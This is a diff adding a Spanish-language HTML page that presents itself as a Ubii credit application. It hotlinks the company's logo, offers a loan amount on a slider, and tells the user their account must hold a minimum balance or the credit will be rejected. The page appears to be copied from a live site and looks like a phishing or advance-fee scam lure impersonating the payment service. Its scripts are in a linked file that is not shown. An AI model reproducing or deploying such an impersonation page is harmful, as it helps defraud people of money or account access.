@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud de Crédito - Ubii</title>
+    <link href="fonts.googleapis.com/css2.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/inline-1.css">
+<link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style></head>
+<body>
+
+<div class="phone-container">
+    <img src="https://ubiionline.ubiipagos.com/LogoUbiiOnline.svg" alt="Logo" class="top-logo">
+
+    <div class="header">
+        <h1>Solicitud de crédito</h1>
+    </div>
+
+    <!-- Monto principal en Dólares arriba y conversión a Bs abajo -->
+    <div class="amount-section">
+        <div class="amount-title" id="displayAmount">$70,00</div>
+        <div class="amount-bs" id="displayBs">Bs. 56.000,00 Tasa BCV</div>
+    </div>
+
+    <div class="slider-container">
+        <!-- value="10" para que inicie al principio -->
+        <input type="range" id="creditSlider" min="70" max="3500" step="5" value="10">
+    </div>
+
+    <div class="tooltip-card">
+        ¡Mueve el deslizador para elegir cuánto crédito necesitas! Asegúrate de que el monto solicitado sea el correcto. Si no tienes disponible el saldo de <span id="displayTooltipBalance">Bs. 8.400,00</span> en tu cuenta tu crédito será rechazado. 
+    </div>
+
+    <div class="quota-box">
+        <div class="label">Debe tener un monto Superior en su cuenta Ubii de</div>
+        <div class="value" id="displayMinBalance">Bs. 8.400,00</div>
+    </div>
+
+    <div class="terms-container">
+        <input type="checkbox" id="terms">
+        <label for="terms">Aceptar términos y condiciones</label>
+    </div>
+
+    <button class="btn-submit active" id="btnSubmit">Solicitar</button>
+</div>
+
+<script src="js/inline-1.js"></script>
+
+
+</body></html>
